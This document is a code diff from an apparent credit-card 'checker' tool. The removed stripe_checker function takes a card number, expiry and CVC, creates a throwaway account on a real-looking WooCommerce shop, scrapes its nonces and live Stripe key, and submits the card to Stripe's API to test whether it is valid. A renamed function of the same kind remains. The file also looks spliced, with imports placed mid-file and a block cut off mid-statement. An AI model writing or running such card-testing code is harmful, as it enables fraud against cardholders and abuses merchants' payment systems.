@@ -464,82 +464,8 @@ def vbv_checker(card_data):
         result['error'] = str(e)[:60]
         return result
 
-def stripe_checker(ccx):
-    ccx = ccx.strip()
-    parts = ccx.split("|")
-    if len(parts) < 4:
-        return "INVALID_FORMAT"
-    n = parts[0]
-    mm = parts[1]
-    yy = parts[2]
-    cvc = parts[3]
-    if "20" in yy:
-        yy = yy.split("20")[1]
-    session = requests.Session()
-    base_url = "https://harmonyofhealth.co.uk"
-    add_payment_url = f"{base_url}/my-account/add-payment-method/"
-    
-    headers = {
-        'authority': 'https://belgraviaenterprise.com',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-    }
-    try:
-        resp = session.get(add_payment_url, headers=headers, timeout=15)
-        if resp.status_code != 200:
-            return "HTTP_ERROR"
-        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
-        if not reg_nonce:
-            return "NONCE_NOT_FOUND"
-        reg_nonce = reg_nonce.group(1)
-    except Exception as e:
-        return f"CONNECTION_ERROR: {str(e)[:50]}"
-    email = f"userjajaj{random.randint(1000,9999)}@gmail.com"
-    data = {
-        'email': email,
-        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'woocommerce-register-nonce': reg_nonce,
-        '_wp_http_referer': '/my-account/add-payment-method/',
-        'register': 'Register',
-    }
-    try:
-        resp = session.post(add_payment_url, headers=headers, data=data, allow_redirects=True, timeout=15)
-    except Exception as e:
-        return f"REGISTER_ERROR: {str(e)[:50]}"
-    try:
-        resp = session.get(add_payment_url, headers=headers, timeout=15)
-        pk_match = re.search(r'(pk_live_[a-zA-Z0-9]+)', resp.text)
-        if not pk_match:
-            return "PK_LIVE_NOT_FOUND"
-        pk_live = pk_match.group(1)
-        addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', resp.text)
-        if not addnonce_match:
-            return "ADDNONCE_NOT_FOUND"
-        addnonce = addnonce_match.group(1)
-    except Exception as e:
-        return f"EXTRACT_ERROR: {str(e)[:50]}"
-    stripe_headers = {
-        'authority': 'api.stripe.com',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-    }
-    stripe_data = (
-        f"type=card&card[number]={n}&card[cvc]={cvc}"
-        f"&card[exp_year]={yy}&card[exp_month]={mm}"
-        f"&allow_redisplay=unspecified"
-        f"&billing_details[address][postal_code]=10090"
-        f"&billing_details[address][country]=US"
-        f"&payment_user_agent=stripe.js%2Ffd4fde14f8%3B+stripe-js-v3%2Ffd4fde14f8%3B+payment-element%3B+deferred-intent"
-        f"&key={pk_live}"
-    )
-    try:
-        resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
-        if resp.status_code != 200:
-            return f"STRIPE_ERROR_{resp.status_code}"
-        payment_id = resp.json().get('id')
-        if not payment_id:
-            return "PAYMENT_ID_NOT_FOUND"
-    except Exception as e:
-        return f"STRIPE_CONN_ERROR: {str(e)[:50]}"
-    ajax_headers = {
+
+
 import requests
 import re
 import uuid
@@ -548,7 +474,7 @@ import time
 import json
 from user_agent import generate_user_agent
 
-def lolaandveranda_com(ccx):
+def stripe_checker(ccx):
     ccx = ccx.strip()
     n = ccx.split("|")[0]
     mm = ccx.split("|")[1]
